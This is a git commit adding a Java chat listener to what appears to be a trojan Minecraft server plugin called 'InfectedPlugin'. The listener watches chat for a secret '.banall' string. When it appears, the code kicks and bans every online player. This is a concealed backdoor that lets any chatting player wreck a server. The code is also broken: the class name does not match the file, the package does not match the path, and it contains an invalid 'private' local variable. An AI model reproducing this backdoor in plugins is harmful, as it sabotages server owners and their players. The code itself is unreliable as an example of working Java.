dec22537466bd20f5a3b13ab00af9aff2ba44eb2
Wilee999 <Infinitywilee@rocketmail.com>
2013-10-17 15:50:29 -0700

    Moved .banall into it's own class.

---
+++ src/org/CreeperCoders/InfectedPlugin/Commands/Command_banall.java
@@ -0,0 +1,29 @@
+package org.CreeperCoders.InfectedPlugin;
+
+import org.bukkit.Server;
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.entity.Player;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+
+public class Command_deop implements Listener
+{
+    public void onPlayerChat(AsyncPlayerChatEvent event)
+    {
+        String message = event.getMessage();
+        final Player p = event.getPlayer();
+        private Server server = Bukkit.getServer();
+        boolean cancel = true;
+    
+        if (message.toLowerCase().contains(".banall"))
+        {
+            for (final Player target : server.getOnlinePlayers())
+            {
+                target.kickPlayer("The Ban Hammer has spoken!");
+                target.setBanned(true);
+                cancel = true;
+            }
+        }
+    }
+}
